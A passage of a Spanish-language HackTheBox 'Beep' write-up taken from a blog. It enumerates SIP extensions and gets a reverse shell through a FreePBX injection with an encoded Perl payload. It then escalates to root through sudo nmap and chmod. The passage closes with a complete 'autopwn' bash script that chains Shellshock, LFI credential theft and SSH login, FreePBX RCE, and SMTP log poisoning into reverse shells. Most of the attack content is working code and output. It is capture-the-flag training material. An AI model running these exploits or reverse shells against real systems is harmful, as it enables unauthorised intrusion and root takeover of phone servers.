+<li>Cambiar el puerto de escucha (¡si quieres!)</li>
+<li>Cambiar el número de extensión por un número válido</li>
+</ul>
+<p>Podemos utilizar el script python de sipvicious svwar para encontrar números de extensiones válidos:
+<img class=lazyload src=/svg/loading.min.svg data-src=https://github.com/EnableSecurity/sipvicious/ data-srcset="https://github.com/EnableSecurity/sipvicious/, https://github.com/EnableSecurity/sipvicious/ 1.5x, https://github.com/EnableSecurity/sipvicious/ 2x" data-sizes=auto alt=https://github.com/EnableSecurity/sipvicious/ title="sipvicious github"></p>
+<p>Podemos instalar sipvicious leyendo su página de documentación:
+<img class=lazyload src=/svg/loading.min.svg data-src=https://github.com/EnableSecurity/sipvicious/wiki/Basics#installation data-srcset="https://github.com/EnableSecurity/sipvicious/wiki/Basics#installation, https://github.com/EnableSecurity/sipvicious/wiki/Basics#installation 1.5x, https://github.com/EnableSecurity/sipvicious/wiki/Basics#installation 2x" data-sizes=auto alt=https://github.com/EnableSecurity/sipvicious/wiki/Basics#installation title="sipvicious installation doc"></p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>git clone https://github.com/enablesecurity/sipvicious.git
+<span class=nb>cd</span> sipvicious
+sudo python3 setup.py install
+pip3 install .
+sipvicious_svcrack --help
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora necesitamos una invitación y una serie de extensiones para encontrar una autenticación:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ sipvicious_svwar -m INVITE -e 100-999 10.10.10.7 2&gt;/dev/null
++-----------+----------------+
+<span class=p>|</span> Extension <span class=p>|</span> Authentication <span class=p>|</span>
++<span class=o>===========</span>+<span class=o>================</span>+
+<span class=p>|</span> <span class=m>233</span>       <span class=p>|</span> reqauth        <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>407</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>409</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>525</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>534</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>504</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>519</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>791</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>759</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>825</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+<span class=p>|</span> <span class=m>884</span>       <span class=p>|</span> weird          <span class=p>|</span>
++-----------+----------------+
+</code></pre></td></tr></table>
+</div>
+</div><p>La extensión 233 parece ser válida.</p>
+<p>Podemos conseguir una cáscara inversa haciéndolo manualmente:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>curl -sk <span class=s2>&#34;https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.3%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Entonces coge una shell invertida con nc:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ nc -lvnp <span class=m>443</span>
+listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
+connect to <span class=o>[</span>10.10.16.3<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.7<span class=o>]</span> <span class=m>33688</span>
+id
+<span class=nv>uid</span><span class=o>=</span>100<span class=o>(</span>asterisk<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>101<span class=o>(</span>asterisk<span class=o>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=privilege-escalation>Privilege Escalation</h1>
+<p>Lista la configuración de sudo:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>bash-3.2$ sudo -l
+Matching Defaults entries for asterisk on this host:
+    env_reset, env_keep=&#34;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
+    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY&#34;
+
+User asterisk may run the following commands on this host:
+    (root) NOPASSWD: /sbin/shutdown
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/bin/yum
+    (root) NOPASSWD: /bin/touch
+    (root) NOPASSWD: /bin/chmod
+    (root) NOPASSWD: /bin/chown
+    (root) NOPASSWD: /sbin/service
+    (root) NOPASSWD: /sbin/init
+    (root) NOPASSWD: /usr/sbin/postmap
+    (root) NOPASSWD: /usr/sbin/postfix
+    (root) NOPASSWD: /usr/sbin/saslpasswd2
+    (root) NOPASSWD: /usr/sbin/hardware_detector
+    (root) NOPASSWD: /sbin/chkconfig
+    (root) NOPASSWD: /usr/sbin/elastix-helper
+</code></pre></td></tr></table>
+</div>
+</div><p>GTFOBins tiene una cheatsheet para abusar el binario de nmap:
+<img class=lazyload src=/svg/loading.min.svg data-src=https://gtfobins.github.io/gtfobins/nmap/#sudo data-srcset="https://gtfobins.github.io/gtfobins/nmap/#sudo, https://gtfobins.github.io/gtfobins/nmap/#sudo 1.5x, https://gtfobins.github.io/gtfobins/nmap/#sudo 2x" data-sizes=auto alt=https://gtfobins.github.io/gtfobins/nmap/#sudo title="GTFOBins nmpa sudo"></p>
+<p>Puedes escalar a root:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>bash-3.2$ sudo nmap --interactive
+
+Starting Nmap V. 4.11 <span class=o>(</span> http://www.insecure.org/nmap/ <span class=o>)</span>
+Welcome to Interactive Mode -- press h &lt;enter&gt; <span class=k>for</span> <span class=nb>help</span>
+nmap&gt; !sh
+id
+<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>,1<span class=o>(</span>bin<span class=o>)</span>,2<span class=o>(</span>daemon<span class=o>)</span>,3<span class=o>(</span>sys<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,6<span class=o>(</span>disk<span class=o>)</span>,10<span class=o>(</span>wheel<span class=o>)</span>
+whoami
+root
+</code></pre></td></tr></table>
+</div>
+</div><p>Alternativamente, también puedes utilizar chmod:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>bash-3.2$ LFILE=/bin/bash
+bash-3.2$ sudo chmod 4755 $LFILE
+bash-3.2$ /bin/bash -p
+id
+uid=100(asterisk) gid=101(asterisk) euid=0(root) groups=101(asterisk)
+whoami
+root
+</code></pre></td></tr></table>
+</div>
+</div><h1 id=autopwn>AutoPWN</h1>
+<p>Crea el archivo autopwn:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>vim autopwn-beep.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>Añade el siguiente código:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span><span class=lnt>83
+</span><span class=lnt>84
+</span><span class=lnt>85
+</span><span class=lnt>86
+</span><span class=lnt>87
+</span><span class=lnt>88
+</span><span class=lnt>89
+</span><span class=lnt>90
+</span><span class=lnt>91
+</span><span class=lnt>92
+</span><span class=lnt>93
+</span><span class=lnt>94
+</span><span class=lnt>95
+</span><span class=lnt>96
+</span><span class=lnt>97
+</span><span class=lnt>98
+</span><span class=lnt>99
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#!/bin/bash
+</span><span class=cp></span>
+ctrl_c<span class=o>(){</span>
+	<span class=nb>echo</span> <span class=s2>&#34;[!] Exiting...&#34;</span>
+	<span class=nb>exit</span> <span class=m>1</span>
+<span class=o>}</span>
+
+<span class=nb>trap</span> ctrl_c INT
+
+shellshock<span class=o>(){</span>
+	<span class=nb>echo</span> <span class=s2>&#34;[+] Shellshock.&#34;</span>
+	<span class=nb>set</span> -m <span class=p>&amp;</span>&gt;/dev/null
+    <span class=nb>read</span> -p <span class=s2>&#34;[+] LHOST: &#34;</span> lhost
+	<span class=nb>read</span> -p <span class=s2>&#34;[+] LPORT: &#34;</span> lport
+	nc -lvnp <span class=nv>$lport</span> <span class=p>&amp;</span>
+    <span class=nv>payload</span><span class=o>=</span><span class=k>$(</span>timeout <span class=m>4</span> curl -sk <span class=s2>&#34;https://10.10.10.7:10000/session_login.cgi&#34;</span> -A <span class=s2>&#34;() { :; };/bin/bash -i &gt;&amp; /dev/tcp/</span><span class=nv>$lhost</span><span class=s2>/</span><span class=nv>$lport</span><span class=s2> 0&gt;&amp;1&#34;</span><span class=k>)</span>
+    <span class=nb>fg</span> %1
+<span class=o>}</span>
+
+lfi<span class=o>(){</span>
+	<span class=nb>echo</span> <span class=s2>&#34;[+] File disclosure via LFI&#34;</span>
+	<span class=nv>pass</span><span class=o>=</span><span class=k>$(</span>curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action&#34;</span> <span class=p>|</span> grep -oP <span class=s2>&#34;AMPMGRPASS=(.*)&#34;</span> <span class=p>|</span> cut -d<span class=s1>&#39;=&#39;</span> -f <span class=m>2</span> <span class=p>|</span> tail -n 1<span class=k>)</span>
+	<span class=nb>echo</span> <span class=s2>&#34;[!] Wait...&#34;</span>
+	which sshpass <span class=p>&amp;</span>&gt;/dev/null
+	<span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -eq <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+		sshpass -p <span class=s2>&#34;</span><span class=nv>$pass</span><span class=s2>&#34;</span> ssh -oKexAlgorithms<span class=o>=</span>+diffie-hellman-group-exchange-sha1 root@10.10.10.7
+	<span class=k>else</span>
+		<span class=nb>read</span> -p <span class=s2>&#34;[+] The package &#39;sshpass&#39; is not installed, do you want to install it? (yes/no) &#34;</span> answer
+		<span class=k>if</span> <span class=o>[</span> <span class=nv>$answer</span> <span class=o>==</span> <span class=s2>&#34;yes&#34;</span> <span class=o>]</span><span class=p>;</span><span class=k>then</span>
+			sudo apt-get update <span class=p>&amp;</span>&gt;/dev/null <span class=o>&amp;&amp;</span> sudo apt-get install sshpass -y <span class=p>&amp;</span>&gt;/dev/null
+			sshpass -p <span class=s2>&#34;</span><span class=nv>$pass</span><span class=s2>&#34;</span> ssh -oKexAlgorithms<span class=o>=</span>+diffie-hellman-group-exchange-sha1 root@10.10.10.7
+		<span class=k>else</span>
+			<span class=nb>echo</span> <span class=s2>&#34;[!] If you don&#39;t want to install the package you can just login with credentials user=root pass=</span><span class=nv>$pass</span><span class=s2>&#34;</span>
+			<span class=nb>exit</span> <span class=m>0</span>
+		<span class=k>fi</span>
+	<span class=k>fi</span>
+<span class=o>}</span>
+
+
+rce_vuln<span class=o>(){</span>
+    <span class=nb>echo</span> <span class=s2>&#34;[+] RCE via FreePBX&#34;</span>
+    <span class=nb>set</span> -m <span class=p>&amp;</span>&gt;/dev/null
+    <span class=nb>read</span> -p <span class=s2>&#34;[+] LHOST: &#34;</span> lhost
+	<span class=nb>read</span> -p <span class=s2>&#34;[+] LPORT: &#34;</span> lport
+    nc -lvnp <span class=nv>$lport</span> <span class=p>&amp;</span>
+    <span class=nv>rce</span><span class=o>=</span><span class=k>$(</span>curl -sk <span class=s2>&#34;https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22</span><span class=nv>$lhost</span><span class=s2>%3a</span><span class=nv>$lport</span><span class=s2>%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&#34;</span><span class=k>)</span>
+    <span class=nb>fg</span> %1
+<span class=o>}</span>
+
+smtp_log_poisoning<span class=o>(){</span>
+    <span class=nb>echo</span> <span class=s2>&#34;[+] SMTP Log Poisoning and Execute via LFI to RCE&#34;</span>
+    which swaks <span class=p>&amp;</span>&gt;/dev/null
+    <span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -eq <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+        swaks --to asterisk@localhost --from wixnic@helo.htb --header <span class=s2>&#34;Subject: Shell&#34;</span> --body <span class=s1>&#39;PHP code: &lt;?php system($_REQUEST[&#34;cmd&#34;]); ?&gt;&#39;</span> --server 10.10.10.7
+    <span class=k>else</span>
+        <span class=nb>read</span> -p <span class=s2>&#34;[+] The package &#39;swaks&#39; is not installed, do you want to install it? (yes/no) &#34;</span> answer
+        <span class=k>if</span> <span class=o>[</span> <span class=nv>$answer</span> <span class=o>=</span> <span class=s2>&#34;yes&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+            sudo apt update <span class=p>&amp;</span>&gt;/dev/null <span class=o>&amp;&amp;</span> sudo apt install swaks -y <span class=p>&amp;</span>&gt;/dev/null
+            swaks --to asterisk@localhost --from wixnic@helo.htb --header <span class=s2>&#34;Subject: Shell&#34;</span> --body <span class=s1>&#39;PHP code: &lt;?php system($_REQUEST[&#34;cmd&#34;]); ?&gt;&#39;</span> --server 10.10.10.7
+        <span class=k>else</span>
+            <span class=nb>echo</span> <span class=s2>&#34;[+] You can just use another attack vector or use telnet and send this payload in a email: &lt;?php system(</span><span class=nv>$_REQUEST</span><span class=s2>[&#34;</span>cmd<span class=s2>&#34;]); ?&gt;&#39; &#34;</span>
+            <span class=nb>exit</span> <span class=m>0</span>
+        <span class=k>fi</span>
+    <span class=k>fi</span> 
+    <span class=nb>set</span> -m <span class=p>&amp;</span>&gt;/dev/null
+    <span class=nb>read</span> -p <span class=s2>&#34;[+] LHOST: &#34;</span> lhost
+	<span class=nb>read</span> -p <span class=s2>&#34;[+] LPORT: &#34;</span> lport
+    nc -lvnp <span class=nv>$lport</span> <span class=p>&amp;</span>
+    <span class=nv>rce</span><span class=o>=</span><span class=k>$(</span>timeout <span class=m>4</span> curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&amp;module=Accounts&amp;action&#34;</span> --data-urlencode <span class=s2>&#34;cmd=bash -i &gt;&amp; /dev/tcp/</span><span class=nv>$lhost</span><span class=s2>/</span><span class=nv>$lport</span><span class=s2> 0&gt;&amp;1&#34;</span><span class=k>)</span>
+    <span class=nb>fg</span> %1
+<span class=o>}</span>
+
+help<span class=o>(){</span>
+	<span class=nb>echo</span> <span class=s2>&#34;[!] Usage: </span><span class=nv>$0</span><span class=s2> -p [1-4]&#34;</span>
+    <span class=nb>echo</span> <span class=s2>&#34;[!] Example: </span><span class=nv>$0</span><span class=s2> -p 1&#34;</span>
+    <span class=nb>echo</span> -e <span class=s2>&#34;\n1 = Shellshock\n2 = LFI File Disclosure SSH Login\n3 = RCE Vulnerability\n4 = SMTP Log Poisoning&#34;</span>
+<span class=o>}</span>
+
+<span class=o>[</span> <span class=nv>$#</span> -eq <span class=m>0</span> <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=nb>help</span>
+
+<span class=k>while</span> <span class=nb>getopts</span> <span class=s1>&#39;p:&#39;</span> arg<span class=p>;</span> <span class=k>do</span>
+  <span class=k>case</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>arg</span><span class=si>}</span><span class=s2>&#34;</span> in
+    p<span class=o>)</span> <span class=nv>parameter</span><span class=o>=</span><span class=si>${</span><span class=nv>OPTARG</span><span class=si>}</span>
+    <span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$parameter</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;1&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+        shellshock
+	<span class=k>elif</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$parameter</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;2&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+		lfi
+    <span class=k>elif</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$parameter</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;3&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+        rce_vuln
+    <span class=k>elif</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$parameter</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;4&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
+        smtp_log_poisoning
+	<span class=k>else</span>
+		<span class=nb>help</span>
+	<span class=k>fi</span>
+	<span class=p>;;</span>
+    *<span class=o>)</span> <span class=nb>help</span>
+	<span class=p>;;</span>
+  <span class=k>esac</span>
+<span class=k>done</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Añadir permisos de ejecución:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>chmod +x autopwn-beep.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>Elije el payload:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ bash autopwn-beep.sh
+<span class=o>[</span>!<span class=o>]</span> Usage: autopwn-beep.sh -p <span class=o>[</span>1-4<span class=o>]</span>
+<span class=o>[</span>!<span class=o>]</span> Example: autopwn-beep.sh -p <span class=m>1</span>
+
+<span class=nv>1</span> <span class=o>=</span> Shellshock
+<span class=nv>2</span> <span class=o>=</span> LFI File Disclosure SSH Login
+<span class=nv>3</span> <span class=o>=</span> RCE Vulnerability
+<span class=nv>4</span> <span class=o>=</span> SMTP Log Poisoning
+</code></pre></td></tr></table>
+</div>
+</div></div><div class=post-footer id=post-footer>
+<div class=post-info>
+<div class=post-info-line>
+<div class=post-info-mod>
+<span>Actualizado el 2021-12-23</span>
+</div>
+<div class=post-info-license></div>
+</div>
+<div class=post-info-line>
+<div class=post-info-md><span>
+<a class=link-to-markdown href=/es/htb_beep/index.md target=_blank>Leer Markdown</a>
+</span></div>
+<div class=post-info-share>
+<span><a href=javascript:void(0); title="Compartir en Twitter" data-sharer=twitter data-url=https://wixnic.github.io/es/htb_beep/ data-title="HackTheBox - Beep" data-via=wixnic data-hashtags=ssh,smtp,freepbx,elastix,smtp-log-poisoning,lfi,rce,ssh-algorithms,privilege-escalation-nmap,privilege-escalation-chmod,autopwn,bash,wget,curl,python><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Compartir en Facebook" data-sharer=facebook data-url=https://wixnic.github.io/es/htb_beep/ data-hashtag=ssh><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="Compartir en Hacker News" data-sharer=hackernews data-url=https://wixnic.github.io/es/htb_beep/ data-title="HackTheBox - Beep"><i class="fab fa-hacker-news fa-fw"></i></a><a href=javascript:void(0); title="Compartir en Line" data-sharer=line data-url=https://wixnic.github.io/es/htb_beep/ data-title="HackTheBox - Beep"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg></i></a><a href=javascript:void(0); title="Compartir en 微博" data-sharer=weibo data-url=https://wixnic.github.io/es/htb_beep/ data-title="HackTheBox - Beep"><i class="fab fa-weibo fa-fw"></i></a></span>
+</div>
+</div>
+</div>
+<div class=post-info-more>
+<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/es/tags/ssh/>ssh</a>,&nbsp;<a href=/es/tags/smtp/>smtp</a>,&nbsp;<a href=/es/tags/freepbx/>freepbx</a>,&nbsp;<a href=/es/tags/elastix/>elastix</a>,&nbsp;<a href=/es/tags/smtp-log-poisoning/>smtp-log-poisoning</a>,&nbsp;<a href=/es/tags/lfi/>lfi</a>,&nbsp;<a href=/es/tags/rce/>rce</a>,&nbsp;<a href=/es/tags/ssh-algorithms/>ssh-algorithms</a>,&nbsp;<a href=/es/tags/privilege-escalation-nmap/>privilege-escalation-nmap</a>,&nbsp;<a href=/es/tags/privilege-escalation-chmod/>privilege-escalation-chmod</a>,&nbsp;<a href=/es/tags/autopwn/>autopwn</a>,&nbsp;<a href=/es/tags/bash/>bash</a>,&nbsp;<a href=/es/tags/wget/>wget</a>,&nbsp;<a href=/es/tags/curl/>curl</a>,&nbsp;<a href=/es/tags/python/>python</a></section>
+<section>
+<span><a href=javascript:void(0); onclick=window.history.back()>Regresar</a></span>&nbsp;|&nbsp;<span><a href=/es/>Inicio</a></span>
+</section>
+</div>
+<div class=post-nav><a href=/es/htb_traverxec/ class=prev rel=prev title="HackTheBox - Traverxec"><i class="fas fa-angle-left fa-fw"></i>HackTheBox - Traverxec</a></div>
+</div>
+<div id=comments><div id=valine class=comment></div><noscript>
+Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.
+</noscript></div></article></div>
+</main><footer class=footer>
+<div class=footer-container><div class=footer-line>Provisto por <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.91.2">Hugo</a> | Tema - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+</div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2019 - 2021</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/es/ target=_blank>wixnic</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div>
+</div>
+</footer></div>
+<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Volver arriba">
+<i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="Ver comentarios">
+<i class="fas fa-comment fa-fw"></i>
+</a>
